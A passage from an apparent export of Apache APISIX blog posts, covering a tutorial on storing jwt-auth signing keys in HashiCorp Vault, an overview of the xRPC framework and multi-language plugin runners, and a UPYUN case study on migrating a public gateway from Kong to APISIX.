sources to guess the signing key and attempt to change the claims within the JWT.\\n\\nSo the storage of these keys in a secure environment is extremely crucial. Falling into wrong hands may jeopardize the security of the whole infrastructure. Though we from the APISIX side take all the means to follow standard SecOps practices, it\'s quite natural in the production environment to have a centralized key management solution like HashiCorp vault to have elaborate audit trails, periodic key rotation, key revocation etc. And it would be quite a troublesome issue if each time you have to update Apache APISIX configuration whenever a key rotation occurs throughout the infrastructure.\\n\\n## Steps to Use Vault with Apache APISIX\\n\\nFor integration with Vault, Apache APISIX needs to be loaded with vault configuration at [config.yaml](https://github.com/apache/apisix/blob/master/conf/config.yaml).\\n\\nInternally, APISIX communicates with vault server [KV secret engine v1](https://www.vaultproject.io/docs/secrets/kv/kv-v1) HTTP [APIs](https://www.vaultproject.io/api/secret/kv/kv-v1). As most enterprise solution prefers to stick with KV Secrets Engine - Version 1 in their production environment, during the initial phase of APISIX-Vault support we have gone with version 1 only. In later releases, we will add the support of K/V version 2.\\n\\nThe main idea of using vault, instead of the APISIX etcd backend is the security concern in a low trust environment. We, the APISIX developers, understand your priorities seriously. That\'s why we recommend using vault access tokens that are short scoped and can grant APISIX server limited access.\\n\\n### Configure Vault\\n\\nIf you have already a Vault instance running with the necessary privileges, feel free to skip this section. This section shares the best practices to use Vault inside the Apache APISIX ecosystem. Please follow the steps mentioned below.\\n\\n#### Step 1: Spin Up a Vault Server\\n\\nHere you have multiple options, feel free to choose between docker, precompiled binary or building from source. As to communicate with the vault server, you need a vault CLI client, I would prefer going with precompiled binary instead of the Docker approach. Anyway, it\'s totally up to you (feel free to consult [Vault\'s official installation docs](https://www.vaultproject.io/docs/install)). To spin up a development server, please run the following command.\\n\\n```shell\\n$ vault server -dev -dev-root-token-id=root\\n\u2026\\nWARNING! dev mode is enabled! In this mode, Vault runs entirely in-memory\\nand starts unsealed with a single unseal key. The root token is already\\nauthenticated to the CLI, so you can immediately begin using Vault.\\nYou may need to set the following environment variable:\\nexport VAULT_ADDR=\'http://127.0.0.1:8200\'\\nThe unseal key and root token are displayed below in case you want to\\nseal/unseal the Vault or re-authenticate.\\nUnseal Key: 12hURx2eDPKK1tzK+8TkgH9pPhPNJFpyfc/imCLgJKY=\\nRoot Token: root\\nDevelopment mode should NOT be used in production installations!\\n```\\n\\nSet your current CLI with the correct environment variables.\\n\\n```shell\\n$ export VAULT_ADDR=\'http://127.0.0.1:8200\'\\n$ export VAULT_TOKEN=\'root\'\\n```\\n\\nEnable vault k/v version 1 secret engine backend with a suitable path prefix. In this demo, we are going to choose the `kv` path so that we don\'t have a collision with the vault default secret path for kv version 2.\\n\\n```shell\\n$ vault secrets enable -path=kv -version=1 kv\\nSuccess! Enabled the kv secrets engine at: kv/\\n\\n\\n# To reconfirm the status, run\\n$ vault secrets list\\nPath          Type         Accessor              Description\\n----          ----         --------              -----------\\ncubbyhole/    cubbyhole    cubbyhole_4eeb394c    per-token private secret storage\\nidentity/     identity     identity_5ca6201e     identity store\\nkv/           kv           kv_92cd6d37           n/a\\nsecret/       kv           kv_6dd46a53           key/value secret storage\\nsys/          system       system_2045ddb1       system endpoints used for control, policy and debugging\\n```\\n\\n#### Step 2: Generate a Vault Access Token for APISIX\\n\\nThis article is regarding using vault in `jwt-auth` plugin perspective. So, for an APISIX consumer (if you are unfamiliar with consumers in the APISIX ecosystem, please read the [document about Apache APISIX Consumer](https://apisix.apache.org/docs/apisix/terminology/consumer)) with username `jack` the `jwt-auth` plugin looks up (if enabled with vault configuration) for secret/s at `<vault.prefix inside config.yaml>/consumer/<consumer.username>/jwt-auth` into vault kv storage. In this context, if you are assigning `kv/apisix` namespace (vault path) as `vault.prefix` inside config.yaml for all apisix related data retrieval, we suggest you to create a policy for path `kv/apisix/consumer/*`. The extra asterisk (*) at the end ensure the policy allows read for any path that has a `kv/apisix/consumer` prefix.\\n\\nCreate a policy file in HashiCorp Configuration Language (HCL).\\n\\n```shell\\n$ tee apisix-policy.hcl << EOF\\npath \\"kv/apisix/consumer/*\\" {\\n    capabilities = [\\"read\\"]\\n}\\nEOF\\n```\\n\\nApplying the policy into vault instance.\\n\\n```shell\\n$ vault policy write apisix-policy apisix-policy.hcl\\n\\nSuccess! Uploaded policy: apisix-policy\\n```\\n\\nGenerate a token with the newly defined policy that has been configured with the small access boundary.\\n\\n```shell\\n$ vault token create -policy=\\"apisix-policy\\"\\n\\n\\nKey                  Value\\n---                  -----\\ntoken                s.KUWFVhIXgoRuQbbp3j1eMVGa\\ntoken_accessor       nPXT3q0mfZkLmhshfioOyx8L\\ntoken_duration       768h\\ntoken_renewable      true\\ntoken_policies       [\\"apisix-policy\\" \\"default\\"]\\nidentity_policies    []\\npolicies             [\\"apisix-policy\\" \\"default\\"]\\n```\\n\\nIn this demonstration `s.KUWFVhIXgoRuQbbp3j1eMVGa` is your access token.\\n\\n### Adding vault configuration into Apache APISIX\\n\\nAs discussed earlier, Apache APISIX communicates with Vault instance through Vault HTTP APIs. The necessary configuration must be added into [config.yaml](https://github.com/apache/apisix/blob/master/conf/config.yaml).\\nHere is the brief information about different fields that you can use:\\n\\n- host: The host address where the vault server is running.\\n- timeout: HTTP timeout for each request.\\n- token: The generated token from vault instance that can grant access to read data from the vault.\\n- prefix: enabling a prefix allows you to better enforcement of policies, generate limited scoped tokens and tightly control the data that can be accessed from APISIX. Valid prefixes are (`kv/apisix`, `secret` etc.)\\n\\n```shell\\nvault:\\n  host: \'http://0.0.0.0:8200\'\\n  timeout: 10\\n  token: \'s.KUWFVhIXgoRuQbbp3j1eMVGa\'\\n  prefix: \'kv/apisix\'\\n```\\n\\n### Create an APISIX Consumer\\n\\nAPISIX has a consumer-level abstraction that goes side by side with authentication scenarios. To enable authentication for any APISIX route, a consumer is needed with a suitable configuration for that specific type of authentication service. Then only APISIX can forward the request to the upstream URI by successfully performing authentication wrt. the consumer configuration. APISIX consumer has two fields - one is `username` (required) to identify one consumer from the others and another is `plugins` that holds the consumer specific plugin configurations.\\n\\nHere, in this article, we will create a consumer with `jwt-auth` plugin. It performs JWT authentication for the respective route/s or service/s.\\n\\nTo enable `jwt-auth` with vault configuration, make a request to:\\n\\n```shell\\n$ curl http://127.0.0.1:9080/apisix/admin/consumers -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"username\\": \\"jack\\",\\n    \\"plugins\\": {\\n        \\"jwt-auth\\": {\\n            \\"key\\": \\"test-key\\",\\n            \\"vault\\": {}\\n        }\\n    }\\n}\'\\n```\\n\\nHere the plugin looks up for key secret inside vault path (`<vault.prefix from conf.yaml>/consumer/jack/jwt-auth`) for consumer `jack` mentioned in the consumer config and uses it for subsequent signing and jwt verification. If the key is not found in the same path, the plugin logs error and fails to perform jwt authentication.\\n\\n#### Set Up a Test Upstream Server\\n\\nTo test the behaviour, you can create a route for an upstream (a simple ping handler that returns pong). You can set it up with a plain go HTTP-Server.\\n\\n```go\\n// simple upstream server\\npackage main\\n\\n\\nimport \\"net/http\\"\\n\\n\\nfunc ping(w http.ResponseWriter, req *http.Request) {\\n    w.Write([]byte(\\"secure/pong\\\\n\\"))\\n}\\n\\n\\nfunc main() {\\n    http.HandleFunc(\\"/secure/ping\\", ping)\\n    http.ListenAndServe(\\":9999\\", nil)\\n}\\n```\\n\\n#### Create an APISIX Route with Authentication Enabled\\n\\nCreate an APISIX route with this secure ping HTTP server and `jwt-auth` authentication plugin enabled.\\n\\n```shell\\n$ curl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"plugins\\": {\\n        \\"jwt-auth\\": {}\\n    },\\n    \\"upstream\\": {\\n        \\"nodes\\": {\\n            \\"127.0.0.1:9999\\": 1\\n        },\\n        \\"type\\": \\"roundrobin\\"\\n    },\\n    \\"uri\\": \\"/secure/ping\\"\\n}\'\\n```\\n\\n#### Generate Token from jwt-auth Plugin\\n\\nNow sign a jwt secret from APISIX that can be used and passed for making requests to the `http://localhost:9080/secure/ping` proxy route to the APISIX server.\\n\\n```shell\\n$ curl http://127.0.0.1:9080/apisix/plugin/jwt/sign\\\\?key\\\\=test-key -i\\nHTTP/1.1 200 OK\\nDate: Tue, 18 Jan 2022 07:50:57 GMT\\nContent-Type: text/plain; charset=utf-8\\nTransfer-Encoding: chunked\\nConnection: keep-alive\\nServer: APISIX/2.11.0\\n\\n\\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ0ZXN0LWtleSIsImV4cCI6MTY0MjU3ODY1N30.nkyev1_KUapVgY_QVYETsSApA6gEkDWS8tsHFV1EpD8\\n```\\n\\nIn the previous step, if you see something like the `failed to sign jwt` message please make sure you have a secret key stored into vault `kv/apisix/consumers/jack/jwt-auth` path.\\n\\n```shell\\n# example\\n$ vault kv put kv/apisix/consumer/jack/jwt-auth secret=$ecr3t-c0d3\\nSuccess! Data written to: kv/apisix/consumer/jack/jwt-auth\\n```\\n\\n#### Request APISIX Server\\n\\nNow, make a request to the APISIX proxy for route `/secure/ping`. Upon successful validation, it will forward the request to our go HTTP server.\\n\\n```shell\\n$ curl http://127.0.0.1:9080/secure/ping -H \'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ0ZXN0LWtleSIsImV4cCI6MTY0MjU3ODU5M30.IYudBr7FTgRme70u4rEBoYNtGmGByzgfGlt8hctI__Q\' -i\\nHTTP/1.1 200 OK\\nContent-Type: text/plain; charset=utf-8\\nContent-Length: 12\\nConnection: keep-alive\\nDate: Tue, 18 Jan 2022 08:00:04 GMT\\nServer: APISIX/2.11.0\\n\\n\\nsecure/pong\\n```\\n\\nAny request without a valid jwt will throw an `HTTP 401 Unauthorized` error.\\n\\n```shell\\n$ curl http://127.0.0.1:9080/secure/ping -i\\nHTTP/1.1 401 Unauthorized\\nDate: Tue, 18 Jan 2022 08:00:33 GMT\\nContent-Type: text/plain; charset=utf-8\\nTransfer-Encoding: chunked\\nConnection: keep-alive\\nServer: APISIX/2.11.0\\n\\n\\n{\\"message\\":\\"Missing JWT token in request\\"}\\n```\\n\\n### Different Use Cases Where Vault Can be Integrated with APISIX jwt-auth plugin\\n\\nApache APISIX `jwt-auth` plugin can be configured to fetch simple text secret keys as well as RS256 public-private key pairs from vault storage.\\n\\n:::note\\nFor the early version of this integration support, the plugin expects the key name of secrets stored into the vault path is among [ `secret`, `public_key`, `private_key`] to successfully use the key. In future releases, we are going to add the support of referencing custom-named keys.\\n:::\\n\\n1. You have stored HS256 signing secret inside the vault and you want to use it for jwt signing and verification.\\n\\n   ```shell\\n   $ curl http://127.0.0.1:9080/apisix/admin/consumers -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n    {\\n        \\"username\\": \\"jack\\",\\n        \\"plugins\\": {\\n            \\"jwt-auth\\": {\\n                \\"key\\": \\"key-1\\",\\n                \\"vault\\": {}\\n            }\\n        }\\n    }\'\\n   ```\\n\\n   Here the plugin looks up for key `secret` inside vault path (`<vault.prefix from conf.yaml>/consumer/jack/jwt-auth`) for consumer jack mentioned in the consumer config and uses it for subsequent signing and jwt verification. If the key is not found in the same path, the plugin logs an error and fails to perform jwt authentication.\\n\\n2. RS256 RSA keypairs, both public and private keys are stored in the vault.\\n\\n   ```shell\\n   $ curl http://127.0.0.1:9080/apisix/admin/consumers -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n    {\\n        \\"username\\": \\"jim\\",\\n        \\"plugins\\": {\\n            \\"jwt-auth\\": {\\n                \\"key\\": \\"rsa-keypair\\",\\n                \\"algorithm\\": \\"RS256\\",\\n                \\"vault\\": {}\\n            }\\n        }\\n    }\'\\n   ```\\n\\n   The plugin looks up for `public_key` and `private_key` keys inside vault kv path (`<vault.prefix from conf.yaml>/consumer/jim/jwt-auth`) for `jim` mentioned inside plugin vault configuration. If not found, authentication fails.\\n\\n   If you are unsure, how to store public and private keys into vault kv storage, use this command\\n\\n   ```shell\\n   # provided, your current directory contains the files named \\"public.pem\\" and \\"private.pem\\"\\n    $ vault kv put kv/apisix/consumer/jim/jwt-auth public_key=@public.pem private_key=@private.pem\\n    Success! Data written to: kv/apisix/consumer/jim/jwt-auth\\n   ```\\n\\n3. Public key in consumer configuration, while the private key is in the vault.\\n\\n   ```shell\\n   $ curl http://127.0.0.1:9080/apisix/admin/consumers -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n    {\\n        \\"username\\": \\"john\\",\\n        \\"plugins\\": {\\n            \\"jwt-auth\\": {\\n                \\"key\\": \\"user-key\\",\\n                \\"algorithm\\": \\"RS256\\",\\n                \\"public_key\\": \\"-----BEGIN PUBLIC KEY-----\\\\n\u2026\u2026\\\\n-----END PUBLIC KEY-----\\"\\n                \\"vault\\": {}\\n            }\\n        }\\n    }\'\\n   ```\\n\\n   This plugin uses RSA public key from consumer configuration and uses the private key directly fetched from the vault.\\n\\n### Disable Vault from Plugin\\n\\nNow, to disable the vault lookup from the `jwt-auth` plugin simply remove the empty vault object from the consumer plugin configuration (in this case it is `jack`). This will make the jwt plugin to lookup signing secrets (both HS256/HS512 or RS512 keypairs) into plugin configuration for subsequent requests to the URI route where the `jwt-auth` configuration has been enabled. Even if you have vault configuration enabled in APISIX `config.yaml` no request will be sent to the vault server.\\n\\nAPISIX plugins are hot-reloaded, therefore is no need to restart APISIX.\\n\\n```shell\\n$ curl http://127.0.0.1:9080/apisix/admin/consumers -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"username\\": \\"jack\\",\\n    \\"plugins\\": {\\n        \\"jwt-auth\\": {\\n            \\"key\\": \\"test-key\\",\\n            \\"secret\\": \\"my-secret-key\\"\\n        }\\n    }\\n}\'\\n```\\n\\n## Summary\\n\\nThis article brings you the upcoming release of the Vault-Apache APISIX integration and related details.\\n\\nFeel free to start a discussion in [GitHub Discussions](https://github.com/apache/apisix/discussions) or communicate via the [mailing list](https://apisix.apache.org/docs/general/join).\\n\\n## Reference\\n\\n[Bisakh\'s Blog](https://blog.bisakh.com/blog/vault-apisix-jwt-auth)"},{"id":"Get More Details About xRPC","metadata":{"permalink":"/blog/2022/01/21/apisix-xrpc-details-and-miltilingual","source":"@site/blog/2022/01/21/apisix-xrpc-details-and-miltilingual.md","title":"Get More Details About xRPC","description":"This article brings you APISIX\'s upcoming xRPC framework, as well as a detailed presentation of Apache APISIX in multi-language development support.","date":"2022-01-21T00:00:00.000Z","formattedDate":"January 21, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":7.36,"truncated":true,"authors":[{"name":"Jinchao Shuai","title":"Author","url":"https://github.com/shuaijinchao","image_url":"https://avatars.githubusercontent.com/u/8529452?v=4","imageURL":"https://avatars.githubusercontent.com/u/8529452?v=4"},{"name":"Sylvia","title":"Technical Writer","url":"https://github.com/SylviaBABY","image_url":"https://avatars.githubusercontent.com/u/39793568?v=4","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"}],"prevItem":{"title":"HashiCorp Vault Secure Storage Backend in Apache APISIX Ecosystem","permalink":"/blog/2022/01/21/apisix-hashicorp-vault-integration"},"nextItem":{"title":"The Practice of Public Gateway in CDN Scenario from UPYUN","permalink":"/blog/2022/01/20/upyun-public-gateway-usecase"}},"content":"> This article brings you Apache APISIX\'s upcoming xRPC framework and related details, as well as a detailed presentation of Apache APISIX in multi-language development support.\\n\\n\x3c!--truncate--\x3e\\n\\nAs business scenarios and requirements become more complex and diverse, more and more standards and protocols are emerging, and Apache APISIX, as a top open source project of the Apache Foundation, has been actively participating in and promoting the expansion of related ecological aspects.\\n\\nIn this article, we will bring you examples of Apache APISIX\'s upcoming xRPC framework and multilingual plug-ins from two perspectives: **multi-protocol proxy and multilingual support**.\\n\\n## Multiprotocol Proxy\\n\\nIn Apache APISIX, each request corresponds to a Route object. There are currently two main proxy scenarios for Apache APISIX.\\n\\n![Two proxy scenarios](https://static.apiseven.com/202108/1642732975469-74071c65-e869-4133-857f-822b58d6b86e.png)\\n\\nThe first is the HTTP protocol proxy, which is currently the most commonly used request proxy in APISIX. Based on the HTTP protocol proxy, Apache APISIX currently implements dozens of traffic governance capabilities, such as fine-grained flow control, security, and observability.\\n\\nThe second is a TCP and UDP-based dynamic protocol proxy and load balancing, which provides the most basic traffic admission capabilities and link-level logging capabilities. This proxy model can proxy any TCP/UDP protocol-based requests such as MySQL, Redis, Mongo or DNS. However, since it is a TCP/UDP based proxy without upper application layer protocols, it can only get some basic information about the quaternion, so it is a little bit weaker in terms of scalability.\\n\\n### Why xRPC\\n\\nDue to the limitations of Stream Route in terms of protocol proxies, and our desire to support more application layer protocols on APISIX to serve more users and application scenarios, the xRPC framework was born.\\n\\nThe xRPC framework makes it very easy to extend protocol capabilities, both specific and private data protocols, **with precise granularity and higher-level 7-level control similar to HTTP protocol proxies**, such as request-level observability, advanced access control, and proxy policies.\\n\\n### What is xRPC\\n\\nxRPC literally means that X is an abstract representation of a protocol resource. And RPC is what we consider all resources passing through the gateway as a process dispatch, i.e. it is a protocol extension framework. So in terms of positioning, xRPC is a base framework rather than an implementation of a specific protocol.\\n\\n![xRPC architecture](https://static.apiseven.com/202108/1642733068660-f479ffcc-5bda-49de-bbd9-0d04d7259450.png)\\n\\nAs you can see from the above architecture, xRPC is a framework based on APISIX Core extensions. On top of this framework, users can implement different application layer protocols, such as Redis, MySQL, Mongo and Postgres. On top of the different protocols, you can abstract some common factors and implement related plug-in capabilities so that different protocols can share these capabilities.\\n\\nSo the main role of xRPC can be summarized as: **providing access to standardized application layer protocols, supporting cross-protocol capability sharing, and allowing users to get the ability to extend custom protocols.**\\n\\n#### Sample Application Scenarios\\n\\nWith the xRPC protocol framework in place, what scenarios can it address? Here are a few examples.\\n\\n- Example 1: Redis does not support TLS in earlier versions. If there are multiple versions of Redis in our system, and we cannot upgrade Redis in production for some reasons, but we need to add TLS capability. In this case, we can use the xPRC-based Redis Protocol to solve the above situation.\\n- Example 2: When we want to limit the frequency of certain IPs or callers and want to visualize the frequency of each call source, which Redis does not support. This is perfectly solved by using the Redis Protocol, which is extended by xRPC.\\n- Example 3: If you want to use MySQL to temporarily enable the slow query function, you just need to access MySQL Protocol and configure the relevant policy in APISIX, which saves you from the tedious step of logging into the instance machine by machine.\\n\\nOf course, there are many similar application scenarios, and we hope that after the release of the feature, you can experience and practice more in the actual application. The process of invoking xPRC is shown in the following diagram.\\n\\n![Invoke process](https://static.apiseven.com/2022/blog/0121/179175317-5cf30a8b-aac2-4538-b9a9-27f99d8d13db.png)\\n\\nOnce the upstream services are taken over by Apache APISIX, the different upstream application services can be managed in a unified manner. Functions such as logging, monitoring, security, and troubleshooting can all be accomplished through a standardized set of policies.\\n\\n#### Planned Implementation Phases\\n\\nThe current design of the Apache APISIX xRPC framework is initially divided into 5 phases.\\n\\n![5 phases about xRPC](https://static.apiseven.com/2022/blog/0121/179175336-3a229407-a9ac-418e-9bde-a48f4a42e056.png)\\n\\n- Phase 1: Read Read data and protocol decoding.\\n- Phase 2: Access Phase Access phase. Provide plug-in access function, which can realize the demand scenarios of security, flow control and access.\\n- Phase 3: Proxy data forwarding and load balancing. Provides access support for custom load balancing policies and algorithms.\\n- Phase 4: Send Sending data and protocol encoding.\\n- Phase 5: Log Phase Logging phase. Provide plug-in access to realize the logging and logging requirements scenarios.\\n\\n## Multilingual Ecology\\n\\nIn order to meet the increasingly rich and large computing language base, creating code support for multi-language environment has become the first threshold to cope with future technology development. Apache APISIX has also done a lot of exploration and practice on the road of multi-language development.\\n\\nFor example, it has recently implemented support for WebAssembly. For details and features, please refer to the article \\"[Apache APISIX Embraces WASM Ecology](https://apisix.apache.org/blog/2021/11/19/apisix-supports-wasm)\\". Of course, the support for WASM in Apache APISIX is still experimental, and we will continue to improve the support for WASM in the future. If you are interested in this project, please feel free to contribute to the [wasm-nginx-module](https://github.com/api7/wasm-nginx-module) project.\\n\\nIn the meantime, Apache APISIX already supports multiple development languages through the \\"xPluginRunner Multilanguage Plugin Runtime\\" before WASM support is implemented. That is, when developing APISIX plug-ins, users can write and extend APISIX plug-ins not only with Lua code, which is natively supported by APISIX, but also with their own familiar languages, such as Go, Java and Python.\\n\\n### xPluginRunner\\n\\n![Implementation of xPluginRunner](https://static.apiseven.com/202108/1642733411405-19b13181-0f5e-46af-837b-66e485f2e0b0.png)\\n\\nThe implementation of xPluginRunner is shown in the figure above. The whole communication process is \\"before\\" and \\"after\\" the execution of the built-in plug-ins, APISIX will initiate local RPC requests to the plug-in runtime of each language. In the plug-in runner, the computation and policy processing within each plug-in is implemented, and the result is finally responded to APISIX for subsequent decision making based on the response result.\\n\\nThe xPluginRunner serves as a bridge for communication with Apache APISIX, and mainly implements the parsing of private data protocols and the encapsulation and unencapsulation of RPC messages.\\n\\nCurrently, the Apache APISIX xPluginRunner solution is in a relatively stable stage, and we know from the community feedback that some enterprises have started to try it in production environments. If you are interested in this project, you are also welcome to participate in various development language plug-in projects.\\n\\n- [apisix-go-plugin-runner](https://github.com/apache/apisix-go-plugin-runner)\\n- [apisix-java-plugin-runner](https://github.com/apache/apisix-java-plugin-runner)\\n- [apache-apisix-python-runner](https://github.com/apache/apisix-python-plugin-runner)\\n\\nFinally, we will show you how to develop APISIX plugins based on Java Plugin Runner with a simple Java example.\\n\\n### Java Plugin Runner Example\\n\\nFirst of all, when developing the plugin, we need to implement the Interface of PluginFilter. `name` method in the Interface is mainly used to identify and extract the plugin name, and `filter` method is used to filter the request (i.e., execute the plugin body logic).\\n\\n![Plugin](https://static.apiseven.com/2022/blog/0121/179175341-dfae292d-3aa2-42ed-a306-c87c47b5ace2.png)\\n\\n![Interface](https://static.apiseven.com/202108/1642733657248-5b7db563-f95f-4683-997e-47e76eeda4d9.png)\\n\\nOne additional point to note is that the `request` and `response` parameters appearing in the above code have fixed logic in the Runner (all Runners apply):\\n\\n1. If you want the request to continue to be forwarded and only do some policy settings (such as rewriting the request parameters, headers, etc.), you can simply manipulate the `request` object.\\n2. If you want to terminate the request, you can do it with the `response` object (e.g. set the response body, response headers, status codes, etc.).\\n\\n:::note Note\\nAPISIX will terminate the current request as soon as it senses that the `response` object in the Runner has been manipulated.\\n:::\\n\\nOnce the plug-in development is completed, it is time to practice the application in APISIX.\\n\\nFirst, compile Runner and the plug-ins in the project into jar packages and configure the absolute path of the jar packages into the main APISIX configuration file in the following way.\\n\\n![Put jar packages into the main APISIX configuration](https://static.apiseven.com/202108/1642733807923-9e3ad231-0094-4e37-a830-29973b43e495.png)\\n\\nFinally, restart Apache APISIX and you are ready for the routing and plugin configuration and request validation sessions.\\n\\n![Route setting](https://static.apiseven.com/202108/1642733908224-64f3ec2c-6d33-4130-b8b6-0fe10e00c48e.png)\\n\\n![Request validation](https://static.apiseven.com/202108/1642733944940-69b06c71-22f7-45e4-9b6d-7f1b62167180.png)\\n\\n## Summary\\n\\nThis article brings you the upcoming release of the xRPC framework for Apache APISIX and related details, as well as a detailed demonstration of Apache APISIX in multi-language development support.\\n\\nThe article also shows the details of Apache APISIX\'s multilanguage development support. It shows the ecology-oriented efforts of Apache APISIX from both the multiprotocol proxy and multilanguage support perspectives.\\n\\nFeel free to start a discussion in [GitHub Discussions](https://github.com/apache/apisix/discussions) or communicate via the [mailing list](https://apisix.apache.org/zh/docs/general/join)."},{"id":"The Practice of Public Gateway in CDN Scenario from UPYUN","metadata":{"permalink":"/blog/2022/01/20/upyun-public-gateway-usecase","source":"@site/blog/2022/01/20/upyun-public-gateway-usecase.md","title":"The Practice of Public Gateway in CDN Scenario from UPYUN","description":"In the public network gateway scenario, UPYUN linked the internal platform and Feishu reminder function based on APISIX.","date":"2022-01-20T00:00:00.000Z","formattedDate":"January 20, 2022","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":5.315,"truncated":true,"authors":[{"name":"Sylvia","url":"https://github.com/SylviaBABY","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"}],"prevItem":{"title":"Get More Details About xRPC","permalink":"/blog/2022/01/21/apisix-xrpc-details-and-miltilingual"},"nextItem":{"title":"Biweekly Report (Jan 1 - Jan 16)","permalink":"/blog/2022/01/19/weekly-report-0116"}},"content":"> In the previous sharing, we brought you the application of cloud at the Ingress level. This time, we will introduce you to the current cloud application examples under the public network gateway scenario, hoping to bring you some practical Apache APISIX scenarios to share in the cloud storage industry.\\n\\n\x3c!--truncate--\x3e\\n\\n## Overview\\n\\n[UPYUN](https://www.upyun.com/) is one of the users who have deployed Apache APISIX in their business scenarios. With scenario-based CDN as its core business, UPYUN provides customers with cloud storage, cloud processing, cloud security, traffic marketing and other services to help users achieve accelerated content distribution, accelerated product development and accelerated business growth.\\n\\nAt present, Apache APISIX has been used and deployed in two business scenarios: \\"Public Gateway\\" and \\"Ingress Gateway\\". The community has previously published a [use case sharing about the use of Apache APISIX Ingress in UPYUN](https://apisix.apache.org/blog/2021/09/24/youpaicloud-usercase/) and this time we will introduce you some current application examples in the \\"public gateway\\" scenario, hoping to bring you some practical Apache APISIX scenarios in the \\"cloud storage\\" industry.\\n\\n## Scenario Use Case\\n\\nThe current internal gateway architecture is shown in the figure below. The external traffic is transferred to the internal through Apache APISIX, and then the traffic is transferred to APISIX Ingress through Apache APISIX, and finally reaches the back-end service for subsequent business processing.\\n\\n![Internal architecture](https://static.apiseven.com/202108/1642583583698-f062ab87-c35e-4416-843e-54d59427c782.png)\\n\\nAs the first gateway for external traffic, the public gateway has to take up the heavy responsibility to control all the external traffic into the internal data center.\\n\\nThe original public gateway deployment is Kong, but now Kong has been slowly migrated to Apache APISIX. Currently, 30% of the traffic handled by Kong has been migrated to APISIX, and the migration is still in progress.\\n\\nThe reason for switching from Kong to APISIX is that the Kong architecture requires a connection to a PostgreSQL database. When adding routes or restarting routes, there are thousands and thousands of connections to Postgre, and once they are updated or restarted, there is no way to control the set of connections, even with a proxy on the front side, especially the more routes there are.\\n\\nBased on this, Apache APISIX began to gradually take over the public network gateway function of the cloud, and is currently mainly used in the following business scenarios services:\\n\\n1. Processing API access of CDN edge nodes through APISIX gateway, mainly for subsequent traffic management\\n2. Handle static pages and technical support related traffic through APISIX\\n\\nSince the full migration is not yet completed, Apache APISIX is currently connected to only 3 internal data centers with about 20 machines. In terms of traffic processing, Apache APISIX has done a good job in backing up and carrying traffic.\\n\\nAs a public network gateway, Apache APISIX not only provides unified traffic management at the entrance, but also provides different functions for user login and other scenarios at the data level.\\n\\n### Plug-in scenario: Login to internal platform\\n\\nAt present, within the company, employees need to log in to the internal platform through email and Fishu and other related authentication for access.\\n\\nSpecific code examples are as follows.\\n\\n```json\\n    \\"openid-connect\\": {\\n      \\"access_token_in_authorization_header\\": false,\\n      \\"bearer_only\\": false,\\n      \\"client_id\\": \\"upyun-oauth\\",\\n      \\"client_secret\\": \\"xxxx\\",\\n      \\"disable\\": false,\\n      \\"discovery\\": \\"https://xxxx.upyun.com/oauth2/.well-known/openid-configuration\\",\\n      \\"introspection_endpoint_auth_method\\": \\"client_secret_basic\\",\\n      \\"logout_path\\": \\"/logout\\",\\n      \\"realm\\": \\"apisix\\",\\n      \\"redirect_uri\\": \\"/upyun-oauth\\",\\n      \\"scope\\": \\"openid email profile offline_access\\",\\n      \\"session_contents\\": {\\n        \\"access_token\\": true,\\n        \\"user\\": true\\n      },\\n      \\"set_access_token_header\\": false,\\n      \\"set_id_token_header\\": false,\\n      \\"set_userinfo_header\\": true,\\n      \\"timeout\\": 15\\n    },\\n```\\n\\nUsing the `openid-connect` plugin of Apache APISIX, you can easily interface with the above platforms for employee authentication, and then unify the login to the management platform of UPYUN.\\n\\n![Login Page](https://static.apiseven.com/202108/1642583971338-e3aab730-2b75-4065-ba04-4c4fa3fafad9.png)\\n\\n### Plug-in scenario: linkage with Feishu task reminder\\n\\nIn a more detailed application scenario, FeiShu\'s application is also linked with the openid-connect plug-in and serverless-post-function plug-in.\\n\\nThrough the cooperation of the above plug-ins, relevant user information (username, email or unique user identification within the Fishu application) can be transmitted to the services behind the public network gateway. The gateway gets the relevant identification information and forwards it to the server to complete the linkage function such as Fishu reminder or @.\\n\\n```c\\nreturn function(config, ctx)\\n  local core = require(\'apisix.core\');\\n  local user = ngx.req.get_headers()[\'X-Userinfo\'];\\n....\\n  if name then\\n    if not ctx.consumer_name then\\n      ctx.consumer_name = name;\\n    end;\\n    core.request.set_header(ctx, \'X-Forwarded-Username\', name)\\n  end;\\n  if user_id then\\n    core.request.set_header(ctx, \'X-Forwarded-UserID\', user_id)\\n  end;\\nend\\n```\\n\\nOf course, you can also use the `consumer-restriction` plugin to restrict the Consumer\'s permissions in this process.\\n\\n## Key factors affecting gateway selection under CDN business\\n\\nAs an enterprise user of Apache APISIX, and a business scenario of scenario-based CDN for cloud storage and multi-line processing, YapiCloud also shares some of their criteria for gateway product selection.\\n\\n### Stability\\n\\nAs the external distribution of business on the cloud, the first thing that matters is stability. A stable gateway business products, in addition to ensure the external user experience, but also to ensure that the company\'s internal business deployment of operation and maintenance costs can be effectively controlled. Especially for some companies that are small or have few O&M team members, stability is the key factor to be considered first.\\n\\n### Open source and scalability\\n\\nFor the technical team, open source or not also becomes an important factor in gateway selection. Thanks to the active nature of the community, the first feedback to the community when a bug appears is usually responded to quickly. Unlike closed-source software, if a bug appears, you may not know how long you have to wait to receive a new version with bug fixes after feedback through official channels. Especially for the cloud business processing situation, the response speed is directly related to the company\'s business.\\n\\nAt the same time, the high scalability of open source also brings developers more convenient adaptation and integration. Multi-language extensions such as Apache APISIX facilitate the development of more features based on APISIX for their business scenarios. While reducing development costs, it also improves the 